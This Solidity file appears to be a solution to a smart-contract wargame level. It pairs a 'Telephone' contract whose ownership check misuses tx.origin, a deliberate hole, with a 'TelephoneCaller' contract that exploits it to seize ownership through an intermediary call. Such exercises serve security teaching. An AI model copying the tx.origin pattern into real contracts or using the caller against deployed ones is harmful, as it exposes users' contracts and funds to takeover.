// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
interface TelephoneI {
    function changeOwner(address _owner) external ;
}
contract TelephoneCaller {
    TelephoneI public _telephoneI;
            constructor(address  _contractAddress) {
    _telephoneI = TelephoneI(_contractAddress);

    }
    function call(address _newOwner)public  {
_telephoneI.changeOwner(_newOwner);
    }

}
